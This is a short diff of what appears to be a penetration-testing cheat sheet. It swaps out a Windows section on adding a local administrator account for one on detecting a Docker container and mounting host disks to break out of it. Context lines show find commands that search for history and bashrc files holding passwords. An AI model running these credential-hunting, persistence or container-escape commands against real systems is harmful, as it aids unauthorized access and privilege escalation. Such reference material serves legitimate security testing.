@@ -133,11 +133,22 @@ find / -name *history* 2>/dev/null
 find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
 ```
 
-## Add Local Admin User
+## Checking docker container
 
 ``` bash
-net user /add pentest Pass
-net localgroup administrators pentest /add
+root@315d7648a173:/# ls -lah
+<snip>
+-rwxr-xr-x   1 root root    0 Jun  9 13:01 .dockerenv
+```
+
+``` bash
+mkdir -p /mnt/hola
+```
+
+``` bash
+mount /dev/sda1 /mnt/hola
+mount /dev/sda2 /mnt/hola
+mount /dev/sda3 /mnt/hola
 ```
 
 ## Binaries That AutoElevate
